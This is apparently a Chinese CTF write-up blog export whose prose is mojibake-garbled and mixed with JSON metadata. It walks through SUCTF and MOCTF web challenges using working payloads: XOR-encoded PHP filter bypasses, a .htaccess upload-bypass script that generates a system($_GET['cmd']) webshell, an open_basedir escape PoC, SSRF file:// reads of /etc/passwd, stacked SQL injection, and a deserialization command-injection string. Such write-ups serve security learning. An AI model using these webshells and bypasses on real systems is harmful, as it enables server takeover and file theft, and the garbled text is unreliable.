é•¿åº¦å°äºç­‰äº18ï¼Œä½¿ç”¨çš„å­—ç¬¦ä¸²ç§ç±»å°äºç­‰äº12ï¼Œ 12&gt; preg_match(&apos;/[\\x00- 0-9A-Za-z\\&apos;&quot;\\`~_&amp;.,|=[\\x7F]+/i&apos;, $hhh)&gt; æ­£åˆ™çš„æ„æ€æ˜¯åŒ¹é… \\x00 åˆ°ç©ºæ ¼ (\\x20) çš„å­—ç¬¦ï¼Œ0 åˆ° 9 çš„æ•°å­—ä¸€äº›å­—ç¬¦ ä»¥åŠ DELï¼ˆ\\x7fï¼‰å­—ç¬¦ \\x00 =&gt; @ \\x7F =&gt; å…¶å®è¿™æ˜¯å®Œæ•´çš„ï¼Œåº”è¯¥å­˜åœ¨256ç§ï¼Œç›´åˆ°\\xff é¦–å…ˆç¬¬ä¸€æ­¥éœ€è¦ç»•è¿‡ä¼ å€¼ï¼Œæœ¬åœ°æµ‹è¯•æŠŠ@å»æ‰ï¼Œæç¤º Notice: Undefined index: _ in E:\\Program Files\\phpstudy_pro\\WWW\\2.php on line 4 1è¯´æ˜è¿™é‡Œæ˜¯_å³å¯ï¼Œæ‰€ä»¥getä¼ å€¼çš„keyä¸º_ éŸ©å¤§ä½¬ç‡å…ˆå†™å‡ºäº†å¦‚ä¸‹payloadï¼Œåˆ©ç”¨å¼‚æˆ–æ„é€ å‡º_GETï¼Œå†åˆ©ç”¨{}çš„trick 1?_=$&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;&#123;%ff&#125;();&amp;%ff=phpinfo è‡ªå·±å†™äº†ä¸ªè„šæœ¬ï¼Œå¾ˆä¸‘é™‹ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172import urllibG = []E = []T = []_ = []str = r&apos;\\&apos;&quot;`~_&amp;.,|=[0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;#print len(str)str2 = []for i1 in str: str2.append(ord(i1))#print str2str1 = &quot;0123456789abcdef&quot;str3 = []for i1 in str1: for j1 in str1: tmp = &quot;0x&quot;+i1+j1 str3.append(tmp)num = 1for i1 in str3: for j1 in str3: tmp1 = int(i1,16) tmp2 = int(j1,16) if (tmp1 in str2) or (tmp2 in str2) or (0&lt;=tmp1&lt;=32) or (0&lt;=tmp2&lt;=32) or (tmp1==127) or (tmp2==127): continue if tmp1^tmp2==ord(&apos;G&apos;): G.append(i1+&quot;^&quot;+j1) if tmp1^tmp2==ord(&apos;E&apos;): E.append(i1+&quot;^&quot;+j1) if tmp1^tmp2==ord(&apos;T&apos;): T.append(i1+&quot;^&quot;+j1) if tmp1^tmp2==ord(&apos;_&apos;): _.append(i1+&quot;^&quot;+j1)print _print Gprint Eprint Tminn = 1000000000result = &quot;&quot;for t1 in _: for t2 in G: for t3 in E: for t4 in T: res = set() tmp = t1.split(&apos;^&apos;) res.add(tmp[0]) res.add(tmp[1]) tmp = t2.split(&apos;^&apos;) res.add(tmp[0]) res.add(tmp[1]) tmp = t3.split(&apos;^&apos;) res.add(tmp[0]) res.add(tmp[1]) tmp = t4.split(&apos;^&apos;) res.add(tmp[0]) res.add(tmp[1]) if len(res) &lt;= minn: minn = len(res) result = t1 + &quot; &quot; + t2 + &quot; &quot; + t3 + &quot; &quot; + t4 print resultprint result ä¸€å¼€å§‹åœ¨å¯¹ç»“æœæ›´æ–°çš„æ—¶å€™é€‰æ‹©äº†len(res)&lt;minnï¼Œå¯¼è‡´å‡ºç°çš„ç»“æœå¦‚ä¸‹ %24%3c%3e%2f^%7b%7b%7b%7b è·‘å‡ºæ¥äº†å¾ˆå¤šï¼Œä½†æ˜¯è¦æ³¨æ„æœ‰ä¸€äº›ä¸è¡Œï¼Œæ¯”å¦‚ä¸Šé¢è¿™ä¸ªï¼Œå­˜åœ¨&lt;&gt;ï¼Œä¼šå¯¼è‡´phpè¯­æ³•é”™è¯¯ã€‚æ‰€ä»¥ç”¨éŸ©å¤§ä½¬çš„æ–¹æ³•å°±æ˜¯ç›´æ¥ç”¨%ffå¼‚æˆ–ğŸ‘ å°†ç»“æœæ›´æ–°ä¿®æ”¹ä¸ºlen(res)&lt;=minnï¼Œæˆ–è€…ç›´æ¥ä»åˆ—è¡¨åœ¨é€‰æ‹©æœ€åä¸€ä¸ªå³å¯ï¼Œå¿…ç„¶æ˜¯%ff æœ€åæ„é€  %a0%b8%ba%ab^%ff%ff%ff%ff å®Œæ•´payload 1?_=$&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;&#123;%ff&#125;();&amp;%ff=phpinfo æˆåŠŸæ‰§è¡Œå‡½æ•°ã€‚ æ¥ä¸‹æ¥æ˜¯åˆ©ç”¨get_the_flag()ä¸Šä¼ æ–‡ä»¶ 1234$extension = substr($name, strrpos($name,&quot;.&quot;)+1);if(preg_match(&quot;/ph/i&quot;,$extension)) die(&quot;^_^&quot;); if(mb_strpos(file_get_contents($tmp_name), &apos;&lt;?&apos;)!==False) die(&quot;^_^&quot;);if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;); è‡ªå·±åœ¨å½“å‰é¡µé¢æ„é€ ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼  123456&lt;body&gt; &lt;form method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;ä¸Šä¼ æ–‡ä»¶&quot; /&gt; &lt;/form&gt;&lt;/body&gt; æ³¨æ„ä¸Šé¢çš„nameè¦æ”¹æˆfileï¼Œå’Œä»£ç ä¸€è‡´ strrpos()è¿”å›å­—ç¬¦ä¸² haystack ä¸­ needle æœ€åä¸€æ¬¡å‡ºç°çš„æ•°å­—ä½ç½®ã€‚ è¿”å›æå–çš„å­å­—ç¬¦ä¸²ï¼Œ æˆ–è€…åœ¨å¤±è´¥æ—¶è¿”å› FALSEã€‚ phpçš„åç¼€å’Œ&lt;?ä¼¼ä¹æ— æ³•ç»•è¿‡ï¼ˆphp7.2ï¼‰ï¼Œ ä¸Šä¼ .htaccessï¼Œåœ¨è¿™ä¸ªcæ–‡ä»¶ä¸­é«˜å’Œå®½éƒ½æ˜¯æœ‰#åœ¨å‰é¢çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å³ä½¿æŠŠå®ƒæ”¾åœ¨.htaccessæ–‡ä»¶ä¸­ä¹Ÿä¸ä¼šå½±å“.htaccessçš„å®é™…è¿è¡Œæ•ˆæœï¼Œæ‰€ä»¥æ–°çš„.htaccessæ–‡ä»¶å†…å®¹å¦‚ä¸‹ 123456789#define width 1337#define height 1337AddType application/x-httpd-php .jpgphp_value zend.multibyte 1php_value zend.detect_unicode 1php_value display_errors 1 123æ¥ä¸‹æ¥å¯ä»¥ä¸Šä¼ jpgäº†ï¼Œé‚£ä¹ˆå¯¹äºä¸Šä¼ çš„phpè¦ç»•è¿‡å…¶&lt;?çš„è¿‡æ»¤ï¼Œç›®æ ‡æœåŠ¡å™¨æ˜¯php7.2é‚£ä¹ˆ&lt;script&gt;å½¢å¼ä¸è¡Œï¼Œè¿™é‡Œä½¿ç”¨äº†phpå†…å®¹çš„ä¸åŒç¼–ç æ ¼å¼æ¥bypassï¼Œåªè¦æŠŠå†…å®¹æ¢ä¸ªç¼–ç å½¢å¼å°±å¥½ï¼Œä½œè€…ç”¨çš„æ˜¯utf-16ï¼Œ ç»™å‡ºé“¾æ¥ä¸­ç”Ÿæˆçš„è„šæœ¬ 1234567891011121314151617181920212223242526272829303132333435# !/usr/bin/python3# Description : create and bypass file upload filter with .htaccess# Author : Thibaud Robin# Will prove the file is a legit xbitmap file and the size is 1337x1337SIZE_HEADER = b&quot;\\n\\n#define width 1337\\n#define height 1337\\n\\n&quot;def generate_php_file(filename, script): phpfile = open(filename, &apos;wb&apos;) phpfile.write(script.encode(&apos;utf-16be&apos;)) phpfile.write(SIZE_HEADER) phpfile.close()def generate_htacess(): htaccess = open(&apos;..htaccess&apos;, &apos;wb&apos;) htaccess.write(SIZE_HEADER) htaccess.write(b&apos;AddType application/x-httpd-php .php16\\n&apos;) htaccess.write(b&apos;php_value zend.multibyte 1\\n&apos;) htaccess.write(b&apos;php_value zend.detect_unicode 1\\n&apos;) htaccess.write(b&apos;php_value display_errors 1\\n&apos;) htaccess.close()generate_htacess()generate_php_file(&quot;webshell.php16&quot;, &quot;&lt;?php system($_GET[&apos;cmd&apos;]); die(); ?&gt;&quot;)generate_php_file(&quot;scandir.php16&quot;, &quot;&lt;?php echo implode(&apos;\\n&apos;, scandir($_GET[&apos;dir&apos;])); die(); ?&gt;&quot;)generate_php_file(&quot;getfile.php16&quot;, &quot;&lt;?php echo file_get_contents($_GET[&apos;file&apos;]); die(); ?&gt;&quot;)generate_php_file(&quot;info.php16&quot;, &quot;&lt;?php phpinfo(); die(); ?&gt;&quot;) ä¸€å¼€å§‹ç”¨çš„system()ï¼Œå‘ç°systemè¢«ç¦ç”¨ æŸ¥çœ‹ç¦ç”¨çš„å‡½æ•° ä½¿ç”¨evalæ„é€ ä¸€å¥è¯è¿ä¸Šèšå‰‘ å…ˆå°è¯•äº†èšå‰‘çš„æ’ä»¶å»ç»•è¿‡disabled_functionï¼Œä½†æ˜¯åå¤è¯•æ¢è¿˜æ˜¯ä¸è¡Œ åæ¥å†èšå‰‘çš„å¾®ä¿¡å…¬ä¼—å·å‘äº†ç¯‡æ–‡ç« è¯´ä¸ºä»€ä¹ˆæ˜æ˜æˆåŠŸåˆ›å»ºsoæ–‡ä»¶å´ä¸èƒ½bypassï¼Œå¤±è´¥çš„åŸå› å°±æ˜¯ä¹‹å‰çš„ æ’ä»¶çš„ä»£ç†è„šæœ¬ä½¿ç”¨çš„æ˜¯curlæ¥è¿›è¡Œè½¬å‘çš„ï¼Œè€Œè¿™ä¸ªç¯å¢ƒé‡Œæ²¡æœ‰è¿™ä¸ªæ‰©å±•ï¼Œäºæ˜¯æ”¹ç”¨fsockopenå®ç°ä»£ç†ã€‚ ä¸­é—´å…ˆå°è¯•äº†print_r(scandir(â€˜/â€˜)) è¿˜å­˜åœ¨open_basediré™åˆ¶ æŸ¥æ‰¾php open_basedir bypassçš„poc å°†ä¸‹é¢çš„phpæ–‡ä»¶ä¼ ä¸Šå» 12345678910111213&lt;?php mkdir(&quot;/tmp/fuck&quot;); chdir(&quot;/tmp/fuck&quot;); ini_set(&apos;open_basedir&apos;,&apos;..&apos;); chdir(&apos;..&apos;); chdir(&apos;..&apos;); chdir(&apos;..&apos;); chdir(&apos;..&apos;); chdir(&apos;..&apos;); ini_set(&apos;open_basedir&apos;,&apos;/&apos;); print_r(scandir(&apos;/&apos;)); var_dump(file_get_contents(&apos;THis_Is_tHe_F14g&apos;));?&gt; ================================================== web2åº”è¯¥ç®—æ˜¯éé¢„æœŸè§£ï¼Œå¹¶æ²¡æœ‰çœŸæ­£ç»•è¿‡disable_functionsï¼Œä½†æ˜¯ è¿™æ¬¡æ¯”èµ›åªåšå‡ºäº†è¿™ä¸¤é¢˜ï¼Œè¿˜æ˜¯é å†œå¤§çš„å¤§ä½¬ä»¬å¸¦çš„ï¼Œç»§ç»­åŠ æ²¹ğŸ˜˜ è€Œä¸”æ„Ÿè§‰å­¦åˆ°äº†å¾ˆå¤šçŸ¥è¯†ï¼Œä»¥åè¿˜æ˜¯è¦å¤šçœ‹çœ‹blogï¼ˆpç¥ï¼Œä¸€å¶é£˜é›¶ç­‰å¤§å¤§ä½¬ï¼‰ä»¥åŠæœ€æ–°çš„bypass =============================================================== èµ›åçœ‹äº†wpï¼Œè®°å½•ä¸‹æ²¡åšå‡ºæ¥çš„è§£é¢˜æ€è·¯ python nginx12345678910111213141516171819202122def getUrl(): url = request.args.get(&quot;url&quot;) host = parse.urlparse(url).hostname if host == &apos;suctf.cc&apos;: return &quot;æˆ‘æ‰Œ your problem? 111&quot; parts =list(urlsplit(url)) host = parts[1] if host == &apos;suctf.cc&apos;: return &quot;æˆ‘æ‰Œ your problem? 222 &quot;+host newhost =[] for h in host.split(&apos;.&apos;): newhost.append(h.encode(&apos;idna&apos;).decode(&apos;utf-8&apos;)) parts[1] = &apos;.&apos;.join(newhost) #å»æ‰ url ä¸­çš„ç©ºæ ¼ finalUrl = urlunsplit(parts).split(&apos; &apos;)[0] host = parse.urlparse(finalUrl).hostname if host == &apos;suctf.cc&apos;: return urllib.request.urlopen(finalUrl).read() else: return &quot;æˆ‘æ‰Œ your problem? 333&quot; æˆ‘ä»¬éœ€è¦æœ€ååˆ©ç”¨ä¸‹é¢çš„ä»£ç æ¥è¯»å–æ–‡ä»¶ 1return urllib.request.urlopen(finalUrl).read() é™„ä¸Šè°ƒè¯•ä»£ç  12345678910111213from urllib.parse import *url = &quot;file://suctf.cc&quot;host = urlparse(url)print(host.hostname)parts = list(urlsplit(url))print(parts)host = parts[1]print(&quot;host:&quot;+host)print(parts)finalUrl = urlunsplit(parts).split(&apos; &apos;)[0]print(finalUrl)host = urlparse(finalUrl).hostnameprint(&quot;host:&quot;+host) å…ˆè¯»å–nginxé…ç½®å¾—åˆ°flagè·¯å¾„ ?url=file:////suctf.cc/../../../../../usr/local/nginx/conf/nginx.conf ç„¶åè¯»å–flag ?url=file:////suctf.cc/../../../../../../usr/fffffflag De1taçš„wpç»™å‡ºäº†å¦ä¸€ç§æ–¹æ³•ï¼Œ ?url=file://suctf.c%e2%84%82/etc/passwd å…¶ä¸­%e2%84%82æ˜¯æ€ä¹ˆæ¥çš„ \\u2102 16è¿›åˆ¶==&gt;10è¿›åˆ¶ 8450 ï¼ˆå±äºèŒƒå›´2048 - 65535ï¼‰ ==&gt; 0010 0001 0000 0010 ==&gt; ä»å³è‡³å·¦å°†äºŒè¿›åˆ¶æ•°å¡«å……åˆ°Xé‡Œé¢ 1110XXXX 10XXXXXX 10XXXXXX ==&gt; 11100010 10000100 10000010 ==&gt; 111000101000010010000010 ==&gt; e28482 easy_sql1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071&lt;?php session_start(); include_once &quot;config.php&quot;; $post = array(); $get = array(); global $MysqlLink; //GetPara(); $MysqlLink = mysqli_connect(&quot;localhost&quot;,$datauser,$datapass); if(!$MysqlLink)&#123; die(&quot;Mysql Connect Error!&quot;); &#125; $selectDB = mysqli_select_db($MysqlLink,$dataName); if(!$selectDB)&#123; die(&quot;Choose Database Error!&quot;); &#125; foreach ($_POST as $k=&gt;$v)&#123; if(!empty($v)&amp;&amp;is_string($v))&#123; $post[$k] = trim(addslashes($v)); &#125; &#125; foreach ($_GET as $k=&gt;$v)&#123; if(!empty($v)&amp;&amp;is_string($v))&#123; $get[$k] = trim(addslashes($v)); &#125; &#125; //die(); ?&gt;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;a&gt; Give me your flag, I will tell you if the flag is right. &lt;/a &gt;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;query&quot;&gt;&lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php if(isset($post[&apos;query&apos;]))&#123; $BlackList = &quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\\&quot;&quot;; //var_dump(preg_match(&quot;/&#123;$BlackList&#125;/is&quot;,$post[&apos;query&apos;])); if(preg_match(&quot;/&#123;$BlackList&#125;/is&quot;,$post[&apos;query&apos;]))&#123; //echo $post[&apos;query&apos;]; die(&quot;Nonono.&quot;); &#125; if(strlen($post[&apos;query&apos;])&gt;40)&#123; die(&quot;Too long.&quot;); &#125; $sql = &quot;select &quot;.$post[&apos;query&apos;].&quot;||flag from Flag&quot;; mysqli_multi_query($MysqlLink,$sql); do&#123; if($res = mysqli_store_result($MysqlLink))&#123; while($row = mysqli_fetch_row($res))&#123; print_r($row); &#125; &#125; &#125;while(@mysqli_next_result($MysqlLink)); &#125; ?&gt; ç„¶åä¸»è¦æºç  12345if(strlen($post[&apos;query&apos;])&gt;40)&#123; die(&quot;Too long.&quot;);&#125;$sql = &quot;select &quot;.$post[&apos;query&apos;].&quot;||flag from Flag&quot;;mysqli_multi_query($MysqlLink,$sql); çœ‹æ ·å­åº”è¯¥æ˜¯å †å äº†ï¼Œä½†æ˜¯ä¸€ç›´ä¸çŸ¥é“ || åº”è¯¥æ€ä¹ˆç”¨ é¦–å…ˆè®¾ç½®sqlmodeæ¨¡å¼ä¸ºpipesas_concatï¼Œç„¶åæ¥æ‹¼æ¥è¯­å¥ åœ¨oracle ç¼ºçœæ”¯æŒ é€šè¿‡ â€˜ || â€™ æ¥å®ç°å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œä½†åœ¨mysql ç¼ºçœä¸æ”¯æŒã€‚éœ€è¦è°ƒæ•´mysql çš„sql_mode æ¨¡å¼ï¼špipes_as_concat æ¥å®ç°oracle çš„ä¸€äº›åŠŸèƒ½ select 1;set sql_mode=pipes_as_concat;select 1||flag from flag æ‰€ä»¥æœ¬é¢˜çš„paylaodæ˜¯ 11;set sql_mode=pipes_as_concat;select 1 ç„¶åå½“æ—¶åŠ›å“¥fuzzå‡ºä¸€ä¸ª 12&gt; *,1&gt; ä¹Ÿèƒ½getflag =========================================================== Upload labs 2index.php 12345678910111213141516171819202122232425262728293031323334#index.php&lt;?phpinclude &apos;class.php&apos;;$userdir = &quot;upload/&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]);if (!file_exists($userdir)) &#123; mkdir($userdir, 0777, true);&#125;if (isset($_POST[&quot;upload&quot;])) &#123; // å…è®¸ä¸Šä¼ çš„å›¾ç‰‡åç¼€ $allowedExts = array(&quot;gif&quot;, &quot;jpeg&quot;, &quot;jpg&quot;, &quot;png&quot;); $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]; $file_name = $_FILES[&quot;file&quot;][&quot;name&quot;]; $temp = explode(&quot;.&quot;, $file_name); $extension = end($temp); if ((($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/gif&quot;) || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpeg&quot;) || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/png&quot;)) &amp;&amp; ($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 204800) // å°äº 200 kb &amp;&amp; in_array($extension, $allowedExts) ) &#123; $c = new Check($tmp_name); $c-&gt;check(); if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0) &#123; echo &quot;é”™è¯¯ï¼š: &quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br&gt;&quot;; die(); &#125; else &#123; move_uploaded_file($tmp_name, $userdir . &quot;/&quot; . md5($file_name) . &quot;.&quot; . $extension); echo &quot;æ–‡ä»¶å­˜å‚¨åœ¨: &quot; . $userdir . &quot;/&quot; . md5($file_name) . &quot;.&quot; . $extension; &#125; &#125; else &#123; echo &quot;éæ³•çš„æ–‡ä»¶æ ¼å¼&quot;; &#125; &#125; func.phpæ¥å—urlå‚æ•°ï¼Œå»ä¸Šä¼ ç›®å½•æ‰¾ä¸Šä¼ çš„æ–‡ä»¶ï¼Œè·å–MIMEè¿”å› 1234567891011# func.phpif (isset($_POST[&quot;submit&quot;]) &amp;&amp; isset($_POST[&quot;url&quot;])) &#123; if(preg_match(&apos;/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\\\s)*|(.|\\\\s)*(file|data|\\.\\.)(.|\\\\s)*/i&apos;,$_POST[&apos;url&apos;]))&#123; die(&quot;Go away!&quot;); &#125;else&#123; $file_path = $_POST[&apos;url&apos;]; $file = new File($file_path); $file-&gt;getMIME(); echo &quot;&lt;p&gt;Your file type is &apos;$file&apos; &lt;/p&gt;&quot;; &#125;&#125; class.phpè¿™é‡Œçš„Fileçš„__wakeupå‡½æ•°å¾ˆå¼‚å¸¸ï¼Œé¢„è®¡å°±æ˜¯é¢˜ç›®è€ƒç‚¹äº†ï¼Œä½œç”¨æ˜¯åˆ›å»ºä¸€ä¸ªç±»çš„æ–°å®ä¾‹ï¼Œç»™å‡ºçš„å‚æ•°å°†ä¼ é€’åˆ°ç±»çš„æ„é€ å‡½æ•°ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#class.php&lt;?phpinclude &apos;config.php&apos;;class File&#123; public $file_name; public $type; public $func = &quot;Check&quot;; function __construct($file_name)&#123; $this-&gt;file_name = $file_name; &#125; function __wakeup()&#123; $class = new ReflectionClass($this-&gt;func); $a = $class-&gt;newInstanceArgs($this-&gt;file_name); $a-&gt;check(); &#125; function getMIME()&#123; $finfo = finfo_open(FILEINFO_MIME_TYPE); $this-&gt;type = finfo_file($finfo, $this-&gt;file_name); finfo_close($finfo); &#125; function __toString()&#123; return $this-&gt;type; &#125;&#125;class Check&#123; public $file_name; function __construct($file_name)&#123; $this-&gt;file_name = $file_name; &#125; function check()&#123; $data = file_get_contents($this-&gt;file_name); if (mb_strpos($data, &quot;&lt;?&quot;) !== FALSE) &#123; die(&quot;&amp;lt;? in contents!&quot;); &#125; &#125;&#125; æ¥ä¸‹æ¥è¿™ä¸ªadmin.phpï¼Œéœ€è¦ä¸€ä¸ªssrfç„¶åï¼Œä¹‹åä¼šè§¦å‘getflagå‡½æ•°æŠŠflagå‘åˆ°ä½ æœåŠ¡å™¨ä¸Š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071#admin.php&lt;?phpinclude &apos;config.php&apos;;class Ad&#123; public $ip; public $port; public $clazz; public $func1; public $func2; public $func3; public $instance; public $arg1; public $arg2; public $arg3; function __construct($ip, $port, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3)&#123; $this-&gt;ip = $ip; $this-&gt;port = $port; $this-&gt;clazz = $clazz; $this-&gt;func1 = $func1; $this-&gt;func2 = $func2; $this-&gt;func3 = $func3; $this-&gt;arg1 = $arg1; $this-&gt;arg2 = $arg2; $this-&gt;arg3 = $arg3; &#125; function check()&#123; $reflect = new ReflectionClass($this-&gt;clazz); $this-&gt;instance = $reflect-&gt;newInstanceArgs(); $reflectionMethod = new ReflectionMethod($this-&gt;clazz, $this-&gt;func1); $reflectionMethod-&gt;invoke($this-&gt;instance, $this-&gt;arg1); $reflectionMethod = new ReflectionMethod($this-&gt;clazz, $this-&gt;func2); $reflectionMethod-&gt;invoke($this-&gt;instance, $this-&gt;arg2); $reflectionMethod = new ReflectionMethod($this-&gt;clazz, $this-&gt;func3); $reflectionMethod-&gt;invoke($this-&gt;instance, $this-&gt;arg3); &#125; function __destruct()&#123; getFlag($this-&gt;ip, $this-&gt;port); //ä½¿ç”¨ä½ è‡ªå·±çš„æœåŠ¡å™¨ç›‘å¬ä¸€ä¸ªç¡®ä¿å¯ä»¥æ”¶åˆ°æ¶ˆæ¯çš„ç«¯å£æ¥è·å–flag &#125;&#125;if($_SERVER[&apos;REMOTE_ADDR&apos;] == &apos;127.0.0.1&apos;)&#123; if(isset($_POST[&apos;admin&apos;]))&#123; $ip = $_POST[&apos;ip&apos;]; //ä½ ç”¨æ¥è·å–flagçš„æœåŠ¡å™¨ip $port = $_POST[&apos;port&apos;]; //ä½ ç”¨æ¥è·å–flagçš„æœåŠ¡å™¨ç«¯å£ $clazz = $_POST[&apos;clazz&apos;]; $func1 = $_POST[&apos;func1&apos;]; $func2 = $_POST[&apos;func2&apos;]; $func3 = $_POST[&apos;func3&apos;]; $arg1 = $_POST[&apos;arg1&apos;]; $arg2 = $_POST[&apos;arg2&apos;]; $arg2 = $_POST[&apos;arg3&apos;]; $admin = new Ad($ip, $port, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3); $admin-&gt;check(); &#125;&#125;else &#123; echo &quot;You r not admin!&quot;;&#125; è¿™é¢˜åˆ©ç”¨pharååºåˆ—åŒ–ï¼Œæ€è·¯å¤§æ¦‚æ‡‚äº†ï¼ˆå°±æ˜¯è¿˜ä¸ä¼šğŸ˜ï¼‰ å‚è€ƒé“¾æ¥ï¼šhttps://mp.weixin.qq.com/s/GGnumPklkUNMLZKQL4NbKg https://www.codercto.com/a/92645.html https://www.cnblogs.com/wfzWebSecuity/p/11207145.html?tdsourcetag=s_pctim_aiomsg https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/ http://www.vuln.cn/6001?tdsourcetag=s_pctim_aiomsg https://xz.aliyun.com/t/6042?tdsourcetag=s_pctim_aiomsg https://mp.weixin.qq.com/s/fDz_i3MkwdMzktJGVGn89g https://blog.csdn.net/lixora/article/details/60572357","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://yoursite.com/tags/web/"},{"name":"wp","slug":"wp","permalink":"http://yoursite.com/tags/wp/"}]},{"title":"å‡ é“phpååºåˆ—åŒ–çš„é¢˜","slug":"å‡ é“phpååºåˆ—åŒ–çš„é¢˜","date":"2019-08-16T23:09:59.000Z","updated":"2019-08-22T13:47:37.149Z","comments":true,"path":"2019/08/17/å‡ é“phpååºåˆ—åŒ–çš„é¢˜/","link":"","permalink":"http://yoursite.com/2019/08/17/å‡ é“phpååºåˆ—åŒ–çš„é¢˜/","excerpt":"phpååºåˆ—åŒ–æ˜¯webä¸­å¸¸è§çš„é¢˜ï¼Œå€¼å¾—å¥½å¥½æ•´ç†ä¸€ä¸‹(ã€‚ãƒ»âˆ€ãƒ»)ãƒï¼Œä¸‹é¢è®°å½•å‡ é“ä¹‹å‰åšè¿‡çš„é¢˜ 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;","text":"phpååºåˆ—åŒ–æ˜¯webä¸­å¸¸è§çš„é¢˜ï¼Œå€¼å¾—å¥½å¥½æ•´ç†ä¸€ä¸‹(ã€‚ãƒ»âˆ€ãƒ»)ãƒï¼Œä¸‹é¢è®°å½•å‡ é“ä¹‹å‰åšè¿‡çš„é¢˜ 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt; MOCTF-PUBGindex.php 12345678910111213141516171819202122232425262728293031&lt;?php error_reporting(0); include &apos;class.php&apos;; if(is_array($_GET)&amp;&amp;count($_GET)&gt;0) &#123; if(isset($_GET[&quot;LandIn&quot;])) &#123; $pos=$_GET[&quot;LandIn&quot;]; &#125; if($pos===&quot;airport&quot;) &#123; die(&quot;&lt;center&gt;Â»ÃºÂ³Â¡Â´Ã³ÃÃ‰ÃŒÂ«Â¶Ã ,Ã„Ã£Â±Â»Â´Ã²Ã‹Ã€ÃÃ‹~&lt;/center&gt;&quot;); &#125; elseif($pos===&quot;school&quot;) &#123; echo(&apos;&lt;/br&gt;&lt;center&gt;&lt;a href=&quot;/index.html&quot; style=&quot;color:white&quot;&gt;Â½ÃÃÃ’ÃÂ£Â°Ã”~~&lt;/a&gt;&lt;/center&gt;&apos;); $pubg=$_GET[&apos;pubg&apos;]; $p = unserialize($pubg); // $p-&gt;Get_air_drops($p-&gt;weapon,$p-&gt;bag); &#125; elseif($pos===&quot;AFK&quot;) &#123; die(&quot;&lt;center&gt;Ã“Ã‰Ã“ÃšÃ„Ã£Â³Â¤ÃŠÂ±Â¼Ã¤ÃƒÂ»Â¶Â¯,ÂµÃ´ÂµÂ½ÂºÂ£Ã€Ã¯Ã‘ÃÃ‹Ã€ÃÃ‹~&lt;/center&quot;); &#125; else &#123; die(&quot;&lt;center&gt;You Lose&lt;/center&gt;&quot;); &#125; &#125;?&gt; class.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;?php include &apos;waf.php&apos;; class sheldon&#123; public $bag=&quot;nothing&quot;; public $weapon=&quot;M24&quot;; // public function __toString()&#123; // $this-&gt;str=&quot;You got the airdrop&quot;; // return $this-&gt;str; // &#125; public function __wakeup() &#123; $this-&gt;bag=&quot;nothing&quot;; $this-&gt;weapon=&quot;kar98K&quot;; &#125; public function Get_air_drops($b) &#123; $this-&gt;$b(); &#125; public function __call($method,$parameters) &#123; $file = explode(&quot;.&quot;,$method); echo $file[0]; if(file_exists(&quot;.//class$file[0].php&quot;)) &#123; system(&quot;php .//class//$method.php&quot;); &#125; else &#123; system(&quot;php .//class//win.php&quot;); &#125; die(); &#125; public function nothing() &#123; die(&quot;&lt;center&gt;You lose&lt;/center&gt;&quot;); &#125; public function __destruct() &#123; waf($this-&gt;bag); if($this-&gt;weapon===&apos;AWM&apos;) &#123; $this-&gt;Get_air_drops($this-&gt;bag); &#125; else &#123; die(&apos;&lt;center&gt;The Air Drop is empty,you lose~&lt;/center&gt;&apos;); &#125; &#125; &#125; // $a = new sheldon(); // $a -&gt;bag=&quot;//win.php| cat ./class/flag&quot;; // $a-&gt;weapon = &quot;AWM&quot;; // echo serialize($a);?&gt; å¼€å§‹è§‚å¯Ÿï¼Œclass.phpä¸­å­˜åœ¨ 1234567891011public function __call($method,$parameters)&#123; $file = explode(&quot;.&quot;,$method); echo $file[0]; if(file_exists(&quot;.//class$file[0].php&quot;))&#123; system(&quot;php .//class//$method.php&quot;); &#125; else&#123; system(&quot;php .//class//win.php&quot;); &#125; die();&#125; å½“ä½ è°ƒç”¨çš„æ–¹æ³•ä¸å­˜åœ¨çš„æ—¶å€™ï¼Œä¼šè§£é‡Šå™¨ä¼šè°ƒç”¨__callæ–¹æ³• =&gt; 123public function Get_air_drops($b)&#123; $this-&gt;$b();&#125; =&gt; 123456789public function __destruct()&#123; waf($this-&gt;bag); if($this-&gt;weapon===&apos;AWM&apos;)&#123; $this-&gt;Get_air_drops($this-&gt;bag); &#125; else&#123; 